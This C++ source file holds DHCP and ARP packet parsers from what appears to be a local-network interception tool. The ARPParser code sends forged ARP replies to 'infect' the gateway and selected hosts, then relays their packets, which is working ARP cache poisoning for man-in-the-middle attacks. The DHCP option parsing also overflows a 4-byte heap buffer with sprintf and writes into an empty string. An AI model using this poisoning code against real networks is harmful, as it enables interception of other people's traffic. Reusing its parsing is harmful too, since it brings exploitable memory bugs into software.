#include "parser.h"
#include "arppacket.h"

bool DHCPParser::parse(WPacket& packet)
{
    int tmp = 0;
    if(packet.ethHdr_->type() != WEthHdr::Ip4) { return false; }  // Is ip4 packet?
    if(packet.ipHdr_->p() != WIpHdr::Udp) { return false; }       // Is udp packet?
    if(packet.udpHdr_->sport() != 67 && packet.udpHdr_->dport() != 67) { return false; }  // Is dhcp packet?
    if(!packet.ethHdr_->dmac().isBroadcast()) { return false; }    // Is DHCP Request?

    packet.dhcpHdr_ = (WDhcpHdr*)packet.udpData_.data_;

    GTRACE("<Dhcp>");
    g.mac_ = packet.dhcpHdr_->clientMac();//get mac
    GTRACE("%s",std::string(g.mac_).data());

    gettimeofday(&g.last, NULL);//update connection

    std::map<WMac, Host>::iterator iter = fs.getFsMap().find(g.mac_);
    if(iter != fs.getFsMap().end()) { tmp = 1; }//already exist
    if(!tmp){
        for(WDhcpHdr::Option* opt = packet.dhcpHdr_->first(); opt != nullptr; opt = opt->next()) {
            if(opt->type_ == WDhcpHdr::RequestedIpAddress) { //get ip
                char* buf = (char*)malloc(sizeof(char) * 4);
                for(int i = 0; i < opt->len_ - 1; ++i) {
                    sprintf(buf + 4 * i, "%03d.", *(&opt->len_ + 1 + i));
                }
                sprintf(buf + 12, "%03d", *(&opt->len_ + 4));
                g.ip_ = WIp(std::string(buf));
                GTRACE("%s", std::string(g.ip_).data());
            } else if(opt->type_ == 12){ //get name
                std::string tmp;
                for(int i = 0; i < opt->len_; ++i) {
                    tmp[i] = *(&opt->len_ + 1 + i);
                }
                g.name = std::string(tmp);
            }
        }
    }
    
    if(tmp) {
        GTRACE("already info mac: %s, ip: %s", std::string(g.mac_).data(), std::string(g.ip_).data());
        fs.updateHostInfo(g.mac_, g.ip_, g.last);
    } else {
        fs.addHost(std::pair<WMac,Host>(g.mac_, g)); //insert into fs_map
    }
    return true;
}

bool ARPParser::parse(WPacket& packet) //arp packet parsing
{
    WMac my_mac;
    WIp mask;
    WIp gateway;

    {
        std::lock_guard<std::mutex> lock(packet_instance.m);
        my_mac = packet_instance.intf()->mac();
        mask = packet_instance.intf()->mask();
        gateway = packet_instance.intf()->gateway();
    }

    ARPPacket arppacket_;
    if(packet.ethHdr_->type() != WEthHdr::Arp) { return false; }
    GTRACE("MAC = %s, IP = %s",std::string(packet.ethHdr_->smac()).data(),std::string(packet.arpHdr_->sip()).data());
    if(packet.arpHdr_->sip() == arppacket_.gate_ip && packet.ethHdr_->smac() != my_mac) {
        nbInstance.setGateMac(packet.ethHdr_->smac());
        GTRACE("GATEWAY MAC = %s",std::string(nbInstance.getGateMac()).data());
        return false;
    }
    GTRACE("GATEWAY MAC = %s",std::string(nbInstance.getGateMac()).data());
    //relay

    if(packet.ethHdr_->dmac() == my_mac && packet.arpHdr_->tip() == gateway ) {

        for(std::map<WMac,Host>::iterator iter = nbInstance.getNbMap().begin(); iter != nbInstance.getNbMap().end(); iter++) {
            if(iter->second.ip_ == packet.arpHdr_->sip())return false;
        }

        #ifdef Q_OS_WIN
        if(packet.ethHdr_->smac() == packet.ethHdr_->dmac()) {
            packet.ethHdr_->dmac() = nbInstance.getGateMac();
            packet_instance.write(&packet);
        }
        #endif

        #ifdef Q_OS_LINUX
        if(nbInstance.nbMap.find(packet.ethHdr_->smac()) == nbInstance.nbMap.end()) {//not infection target
            GTRACE("\n\nWOWOWOW");
            packet.ethHdr_->dmac() = nbInstance.getGateMac();
            packet_instance.write(&packet);
        }
        #endif
        return false;
    }

    GTRACE("-----------<full scan>");
    if((packet.arpHdr_->sip() & mask) == (gateway & mask)) {
        g.mac_ = packet.arpHdr_->smac();//get mac
        g.ip_ = packet.arpHdr_->sip(); //get ip
        gettimeofday(&g.last, NULL);

        GTRACE("%s", std::string(g.mac_).data());
        GTRACE("%s", std::string(g.ip_).data());
        GTRACE("%d",g.last.tv_sec);
        std::map<WMac, Host>::iterator iter = fs.getFsMap().find(g.mac_);
        if(iter != fs.getFsMap().end()) {
            GTRACE("already info mac: %s, ip: %s", std::string(g.mac_).data(), std::string(g.ip_).data());
            fs.updateHostInfo(g.mac_, g.ip_, g.last);
        } else {
            g.name = std::string(g.ip_);
            // findName();
            fs.addHost(std::pair<WMac,Host>(g.mac_, g)); //insert into fs_map
        }
    }

    if(packet.ethHdr_->smac() == packet.ethHdr_->dmac()) {
        packet_instance.write(&packet);
    }

    return true;
}

void ARPParser::parse(WPacket& packet, std::map<WMac, Host> nb_map) {
    if(parse(packet)) {
        ARPPacket arp_packet;

        GTRACE("next-parse: %d", packet.arpHdr_->op() == packet.arpHdr_->Request);
        if(packet.arpHdr_->op()==packet.arpHdr_->Request) {//request
            //infection
            std::map<WMac,Host>::iterator iter;
            for(iter = nb_map.begin(); iter != nb_map.end(); ++iter) {
                if(packet.arpHdr_->tip() == iter->second.ip_ && packet.arpHdr_->sip() == packet_instance.intf()->gateway()) {//gateway
                    break;
                }
                else if(packet.arpHdr_->sip() == iter->second.ip_ && packet.arpHdr_->tip() == packet_instance.intf()->gateway()) { //infected device
                    break;
                }
            }
            GTRACE("list");
            if(iter != nb_map.end()) {
                GTRACE("\n\n\n\n\n\nhave nb list");
                WMac my_mac;

                {
                    std::lock_guard<std::mutex> lock(packet_instance.m);
                    my_mac = packet_instance.intf()->mac();
                }

                // Infect gateway
                arp_packet.makeArppacket(nbInstance.getGateMac(), my_mac, nbInstance.getGateMac(), arp_packet.gate_ip, packet.arpHdr_->tip());
                arp_packet.packet.arp.op_ = htons(WArpHdr::Reply);
                arp_packet.send(nbInstance.sendInfectNum);

                // Infect Host
                arp_packet.makeArppacket(g.mac_, my_mac, g.mac_, g.ip_, arp_packet.gate_ip);
                arp_packet.packet.arp.op_ = htons(WArpHdr::Reply);
                arp_packet.send(nbInstance.sendInfectNum);
            }
        }
    }
}

void ARPParser::findName(){
    GTRACE("%s", std::string(g.mac_).data());
    std::string fname = "nmblookup -A ";
    std::string fullname = fname + std::string(g.ip_);
    FILE *fp = popen(fullname.c_str(), "r");

    if(fp == NULL){
        perror("popen() fail");
        exit(1);
    }

    char buf[1024];
    fgets(buf, 1024, fp);
    if(fgets(buf, 1024, fp)){
        std::string str(strtok(buf, " "));
        str.erase(str.begin());
        g.name = (char*)malloc(sizeof(char) * str.size());
        g.name = str;
        GTRACE("%s", str.data());
    }
}
